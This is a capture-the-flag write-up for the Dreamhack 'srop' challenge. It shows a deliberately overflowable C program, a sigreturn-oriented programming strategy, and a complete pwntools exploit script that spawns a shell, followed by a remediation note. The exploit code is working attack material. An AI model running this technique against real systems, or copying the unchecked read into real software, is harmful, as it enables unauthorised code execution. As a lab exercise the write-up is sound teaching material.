---
title: "[Dreamhack] srop - Write up"
date: 2024-01-15 00:00:00 +0700
categories: [Dreamhack, Binary Exploitation]
tags: [pwn, srop, sigreturn, syscall, dreamhack]
author: datious
---
[Write up for dreamhack]__Challenge: srop | Author: datious

srop.c
```
// Name: srop.c
// Compile: gcc -o srop srop.c -fno-stack-protector -no-pie

#include <unistd.h>

int gadget() {
  asm("pop %rax;"
      "syscall;"
      "ret" );
}

int main()
{
  char buf[16];
  read(0, buf ,1024); //vuln
}

```

The vulnerability in this program is a buffer overflow. This allows us hijack program's control flow.

#1. Analyze and Gather ingredients for exploitation
    - First, I check the protection layers of the program.
    ![image](https://hackmd.io/_uploads/rkqYSlDHGg.png)
    - As you can see, NX is enabled, so we can't execute shellcode on the stack.
    - Next, I checked whether useful gadgets exist in this program. 
    - I found a very interesting gadget. 
    
    
    ```
    0x00000000004004eb : pop rax ; syscall
    ```
    
- My idea is to leverage rt_sigreturn to write the **/bin/sh**   string into writable memory and execute **execve("/bin/sh")**.

#2. Exploitation and Strategy (SROP)
    2.1. Use rt_sigreturn to execute frame1(**read(0, rw_memory, len(stage2))**).(stage1)

```
frame1=SigreturnFrame()
frame1.rsp=rw
frame1.rax=0
frame1.rdi=0
frame1.rsi=rw
frame1.rdx=len(stage2)
frame1.rip=syscall
stage1=p64(1)
stage1+=p64(2)
syage1+=p64(15)
stage1+=p64(pop_rax_syscall)
stage1+=p64(15)

stage1+=bytes(frame1)
```
2.2 Send the **"/bin/sh"** string and arrange frame2 into writable memory.

```
stage2=p64(pop_rax_syscall)+p64(15)

frame2=SigreturnFrame()
frame2.rsp=rw
frame2.rax=0x3b
frame2.rdi=rw+0x200
frame2.rsi=0
frame2.rdx=0
frame2.rip=syscall
stage2+=bytes(frame2)
stage2=stage2.ljust(0x200,b'\x00')
stage2+=b'/bin/sh\x00'
```
- I arranged stage2 into the writable memory and set up **frame2(execve("/bin/sh"))**. In frame1, I set **frame1.rsp=rw**, so that when finish executing, the program will return to rw section (where stage2, frame2 and the "/bin/sh" string are placed).
- The flow: stage1 (rt_sigreturn(1))->kernel-> restore frame1 (read(0,rw,len(stage2)))-> sends stage2(rt_sigreturn+frame2+"/bin/sh") -> stage2 is placed into rw memory -> Because frame1.rsp=rw, after read(0,rw,len(stage2)) finishes, the program returns to rw (rip=rsp=rw) -> rt_sigreturn(2) -> kernel -> restore frame2 (execve("/bin/sh")).

3. Exploit Script
```
#!/usr/bin/python3
from pwn import *
import os
exe=ELF('./srop',checksec=False)
#p=remote("host3.dreamhack.games",19369)
p=process(exe.path)

context.terminal=['konsole','-e']


context.arch="x86_64"

pop_rax_syscall=0x00000000004004eb
pop_rdi=0x0000000000400583
ret=0x00000000004003de
syscall=0x00000000004004ec
pop_rsi=0x0000000000400581 #pop_r15
rw=0x0000000000601100

stage2=p64(pop_rax_syscall)+p64(15)

frame2=SigreturnFrame()
frame2.rsp=rw
frame2.rax=0x3b
frame2.rdi=rw+0x200
frame2.rsi=0
frame2.rdx=0
frame2.rip=syscall
stage2+=bytes(frame2)
stage2=stage2.ljust(0x200,b'\x00')
stage2+=b'/bin/sh\x00'


frame1=SigreturnFrame()
frame1.rsp=rw
frame1.rax=0
frame1.rdi=0
frame1.rsi=rw
frame1.rdx=len(stage2)
frame1.rip=syscall
stage1=p64(1)
stage1+=p64(2)
stage1+=p64(15)
stage1+=p64(pop_rax_syscall)
stage1+=p64(15)

stage1+=bytes(frame1)
p.sendline(stage1)
sleep(0.5)


p.sendline(stage2)

p.interactive()
```


Remediation
    - The issue: a classic stack-based buffer overflow due to an unchecked input length.
    - The fix: limit the number of bytes accepted by the read() to match to the actual size of the destination buffer (changing 1024 to 16 or using fgets())


Goodluck!!!